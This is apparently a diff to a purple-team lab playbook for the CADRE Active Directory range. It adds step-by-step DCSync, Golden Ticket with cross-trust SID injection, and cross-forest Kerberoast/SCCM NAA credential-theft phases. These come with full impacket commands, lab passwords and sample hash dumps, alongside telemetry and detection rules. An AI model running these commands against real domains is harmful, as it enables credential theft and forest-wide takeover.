@@ -1963,3 +1963,251 @@ krbtgt:502:aad3b435...:hash:::
 - WT094 (UnCanny) is the modern alternative but requires Developer Mode
 
 ---
+
+
+## Mechanics: Phase 6 — Privilege Escalation (DCSync — WT009)
+
+**Status:** Ready to test. Prereq: any DA-cred OR DCSync rights. Phase 5 (coercion) feeds into this.
+
+### Why it works
+DCSync abuses the AD replication protocol (MS-DRSR). Any account with `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (or the bundled `Replicating Directory Changes` extended right) can request a full domain dump from a DC.
+
+The attacker impersonates a DC and asks the real DC to replicate the domain. The DC returns all user/computer hashes including the `krbtgt` account. The `krbtgt` hash = Golden Ticket forging = persistent DA for the domain.
+
+Two sub-techniques:
+- **DCSync via replication (most common)**: Use secretsdump.py to ask DC for replication
+- **DCSync via ntdsutil + manual replication**: Rare, used when secretsdump is blocked
+
+### Attack commands
+```bash
+# Once you have any DA-cred (from Phase 5 coercion or Phase 7 Golden Ticket)
+export KRB5CCNAME=/tmp/dc02.ccache  # captured TGT from Phase 5
+impacket-secretsdump -just-dc child.cadre.local/ -k -no-pass -dc-ip 192.168.77.11
+# OR with NTLM hash:
+impacket-secretsdump -just-dc 'child.cadre.local/Administrator@192.168.77.11' \
+    -hashes :<ntlm_hash>
+```
+
+### What to expect (success)
+```
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:d6c2a05bcf04ed8a39b73c5f50c4f7e0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:hash_here:::
+svc_mssql:1111:aad3b435b51404eeaad3b435b51404ee:<hash>:::
+... (all user/computer hashes)
+```
+
+The `krbtgt` hash is the crown jewel — you can forge Golden Tickets.
+
+### What to expect (failure modes)
+- **`STATUS_ACCESS_DENIED`**: Account doesn't have DCSync rights. Need DA or explicit ACE#13+14.
+- **Connection refused on dc02:135**: DC firewall or RPC service down.
+- **`KDC_ERR_WRONG_REALM`**: Wrong DC. Use dc02 for child.cadre.local.
+- **secretsdump crashes**: Outdated impacket. Update to latest.
+
+### CADRE-specific notes
+- **ACE#13+14 (eng_agentic → DC=cadre: GetChanges+All)** is an alternative DCSync path WITHOUT being DA — see CAMPAIGNS.md Branch A.
+- **Phase 5 (coercion)** captures `dc02$` TGT → use that TGT for DCSync via kerberos auth
+- **Phase 7 (Golden Ticket)** uses the DCSync output (`krbtgt` hash) to forge tickets
+- **DCSync chains**: Phase 5 → Phase 6 → Phase 7 (coercion → DCSync → Golden Ticket)
+
+### Telemetry fingerprint
+- **WinSec 4662** (DS object accessed): high — every object replicated
+- **WinSec 4624** (logon) Type 3 (network) from attacker IP
+- **WinSec 4673** (privileged operation): sensitive privilege used
+- **Zeek dce_rpc.log**: DRSUAPI opnum 3 (DRSGetNCChanges) from non-DC source
+- **Zeek kerberos.log**: AS-REQ from attacker machine account (if using TGT)
+- **Suricata SID:1000002** (DCSync): 63 confirmed fires in lab
+
+### Detection engineering
+- **Suricata SID:1000002** (DCSync): confirmed working, 63 fires in lab
+- **Elastic rule (planned)**: `event.code:4662 AND object_name:*CN=Configuration* AND access_mask:0x100` from non-DC source
+- **Zeek alert**: `dce_rpc.opnum == 3` (DRSGetNCChanges) from non-DC source
+
+### Common pitfalls
+- **`secretsdump` requires DA OR explicit DCSync rights** — verify the creds have either
+- **Wrong DC**: child.cadre.local uses dc02 (192.168.77.11). cadre.local uses dc01 (192.168.77.10).
+- **Stale Kerberos ticket**: After coercing dc02$, export KRB5CCNAME immediately. Tickets have ~10 hour lifetime.
+- **`-just-dc` vs full dump**: `-just-dc` only extracts hashes. Without it, also extracts cached creds, LSA secrets, etc. Use `-just-dc` for cleaner output.
+
+### Reproduction checklist
+- [ ] DA-cred obtained (Phase 5 or Branch A)
+- [ ] KRB5CCNAME exported (or NTLM hash ready)
+- [ ] DC reachable on port 135 + 445 + dynamic RPC
+- [ ] secretsdump runs without errors
+- [ ] `krbtgt` hash captured (write down — this is the crown jewel)
+- [ ] All user/computer hashes captured
+
+---
+
+## Mechanics: Phase 7 — Forest Trust Escalation (WT010-012 Golden/Silver/Diamond Ticket)
+
+**Status:** Ready to test. Prereq: `krbtgt` hash from Phase 6 DCSync.
+
+### Why it works
+Kerberos tickets are signed by the KDC. Once you have the `krbtgt` hash, you can forge ANY ticket that the real KDC would issue:
+- **TGT** (Golden Ticket): domain-wide DA. Survives credential resets.
+- **TGS** (Silver Ticket): service-specific. No KDC contact needed.
+- **Diamond Ticket**: modifies a legitimate TGT (less anomalous than Golden).
+
+#### CADRE's specific path
+- child.cadre.local ↔ cadre.local has **SID Filtering: OFF** (verified in `01-core-ad.yml:50`)
+- Forge child TGT with root's Enterprise Admins (EA) SID injected via `-extra-sid`
+- Use the ticket to access cadre.local resources as EA
+- This gives **root domain DA** = entire forest compromise
+
+### Attack commands
+```bash
+# Step 1 — Get root EA SID (from child DC, using DA cred)
+impacket-lookupsid -hashes :<child_admin_nthash> \
+    child.cadre.local/Administrator@192.168.77.11
+# Look for S-1-5-21-...-519 (Enterprise Admins)
+
+# Step 2 — Forge Golden Ticket with root EA SID injection
+impacket-ticketer -nthash <child_krbtgt_hash> \
+    -domain-sid <child_sid> \
+    -domain child.cadre.local \
+    -extra-sid <root_EA_SID> \
+    Administrator
+
+# Step 3 — Use the forged ticket
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec cadre.local/Administrator@dc01.cadre.local -k -no-pass
+```
+
+### What to expect (success)
+```
+[*] Creating basic skeleton ticket and adding attributes
+[*] Encrypted ticket saved to Administrator.ccache
+[*] Wrote ticket to Administrator.ccache
+[*] Trying to connect to dc01.cadre.local
+[!] Shell opening...
+nt authority\system  ← or whoever the service runs as on dc01
+```
+
+### What to expect (failure modes)
+- **KRB_AP_ERR_MODIFIED**: TGT signature wrong. Verify `child_krbtgt_hash` is correct (not rc4/aes mix-up).
+- **KDC_ERR_POLICY**: SID Filtering blocked. Verify `SIDFilteringQuarantined = $false` on the trust.
+- **KDC_ERR_TGT_REVOKED**: TGT was revoked. Re-forge.
+
+### CADRE-specific notes
+- **SID Filter: OFF** (per `01-core-ad.yml:50` — `SIDFilteringQuarantined = $false`)
+- **Forest trust**: cadre.local ↔ child.cadre.local, bidirectional
+- **EA SID format**: `S-1-5-21-<root-domain-SID>-519` (519 = EA group RID)
+- **CADRE's specific attack**: forge child TGT with root EA SID → access dc01 as EA
+- **Survives credential resets**: only defeated by rotating `krbtgt` password TWICE
+
+### Telemetry fingerprint
+- **Zeek kerberos.log**: TGS-REQ with referral across trust — inter-realm TGT
+- **WinSec 4624** Type 3 (network) on dc01 with EA-equivalent group membership
+- **Suricata**: cross-realm Kerberos traffic
+
+### Detection engineering
+- **Elastic rule (planned)**: inter-realm TGT requests from non-DC source
+- **4662 on ForeignSecurityPrincipals container**: SID injection signal
+- **Referral pattern**: TGS-REQ without preceding AS-REQ = forged ticket indicator
+
+### Common pitfalls
+- **Wrong hash type**: krbtgt AES256 ≠ RC4. Use the right hash for the encryption type.
+- **Missing extra-sid**: Forged TGT without `-extra-sid` = only DA of child. For root EA, need root EA SID.
+- **Rotated krbtgt**: After the lab's krbtgt rotation, old tickets fail. Re-DCSync.
+- **AES vs RC4 mismatch**: Modern KDCs default to AES. secretsdump outputs `aes256_cts_hmac_sha1_96` and `rc4_hmac` — use the AES one.
+
+### Reproduction checklist
+- [ ] krbtgt hash from Phase 6 DCSync
+- [ ] root EA SID (via lookupsid)
+- [ ] impacket-ticketer succeeds
+- [ ] psexec to dc01 works as EA
+
+---
+
+## Mechanics: Phase 8 — Cross-Forest + External Domain (WT033-039)
+
+**Status:** Ready to test. Prereq: cadre.local DA (from Phase 7 Golden Ticket).
+
+### Why it works
+CADRE has a forest trust between `cadre.local` ↔ `range.local`. With cadre.local DA, you can:
+1. **Cross-forest Kerberoast** (WT033): request TGS for range.local SPNs from cadre.local
+2. **SCCM NAA extraction** (WT034): use svc_sccm (cracked from Kerberoast) to extract NAA creds
+3. **svc_naa is DA in range.local** (over-privileged)
+4. **DCSync to dc03** (range.local's DC) → all 3 domains compromised
+
+### Attack commands
+```bash
+# Step 1 — Cross-forest Kerberoast (from Kali, using cadre.local DA cred)
+impacket-GetUserSPNs cadre.local/chief_command:'C0mm@nd_Ch1ef!' \
+    -target-domain range.local -dc-ip 192.168.77.12 -request
+# Get TGS for svc_sccm
+
+# Step 2 — Crack svc_sccm hash
+hashcat -m 19700 svc_sccm.hash /path/to/cadre_passwords.txt
+# Expected: s3rv1c3_SCCM!
+
+# Step 3 — NAA extraction
+# Read bait file on mbr02 vault share
+smbclient //192.168.77.23/vault -U range.local/svc_sccm%'s3rv1c3_SCCM!' \
+    -c "get naa-rotation-notice.txt"
+# Returns: RANGE\svc_naa : N@A_s3rv1c3!
+
+# Step 4 — svc_naa is DA in range.local
+impacket-psexec range.local/svc_naa:'N@A_s3rv1c3!'@192.168.77.12
+
+# Step 5 — DCSync range.local
+impacket-secretsdump -just-dc range.local/svc_naa:'N@A_s3rv1c3!'@192.168.77.12
+```
+
+### What to expect (success)
+```
+$krb5tgs$23$*svc_sccm$RANGE.LOCAL*mbr02.range.local*$hash...:$
+s3rv1c3_SCCM!  # cracked
+
+RANGE\svc_naa : N@A_s3rv1c3!  # from NAA bait file
+
+[*] Dumping Domain Credentials
+range.local\Administrator:500:hash:::
+range.local\krbtgt:502:hash:::
+... (full range.local secrets)
+```
+
+### What to expect (failure modes)
+- **Cross-forest Kerberoast returns 0 hashes**: Wrong target domain. Use `-target-domain range.local`.
+- **NAA bait file not found**: SCCM not configured. Check `10-sccm-verify.yml`.
+- **svc_naa is not DA**: NAA over-privilege not configured. Check playbook.
+
+### CADRE-specific notes
+- **range.local** is the third domain (forest 2) — dc03 (192.168.77.12), mbr02 (192.168.77.23)
+- **SCCM site**: mbr02 (site code `CAD`)
+- **NAA config**: per `10-sccm-verify.yml` — NAA over-privileged as DA
+- **svc_sccm is SCCM Full Admin** on the CAD site
+- **svc_naa is range.local DA** (per ACE#23 — analyst_osint → svc_naa: GenericAll)
+- **mbr02 has CLR enabled + TRUSTWORTHY ON** for alternative SQL execution (WT042)
+
+### Telemetry fingerprint
+- **WinSec 4624** Type 3 (network): inter-forest Kerberos auth
+- **WinSec 4662**: SCCM NAA credential access
+- **WinSec 4673**: privileged operation on NAA
+- **WinSec 7045** (new service): SCCM service install
+- **Zeek kerberos.log**: cross-realm TGS-REQ
+- **Suricata**: cross-forest Kerberos pattern
+
+### Detection engineering
+- **Inter-forest TGS requests**: Unusual — flag for review
+- **SCCM NAA access**: should be rare, alert on every read
+- **Cross-forest DCSync**: see Phase 6
+
+### Common pitfalls
+- **Wrong DC IP**: range.local = dc03 (192.168.77.12), not cadre.local's dc01
+- **Trust direction**: cadre.local → range.local (impacket uses `-target-domain`)
+- **SCCM not configured**: Check `10-sccm-verify.yml` ran
+
+### Reproduction checklist
+- [ ] cadre.local DA (Phase 7)
+- [ ] Cross-forest Kerberoast succeeds
+- [ ] svc_sccm hash cracked
+- [ ] NAA bait file accessible
+- [ ] svc_naa is DA in range.local
+- [ ] DCSync range.local succeeds
+- [ ] All 3 domains compromised
+
+---
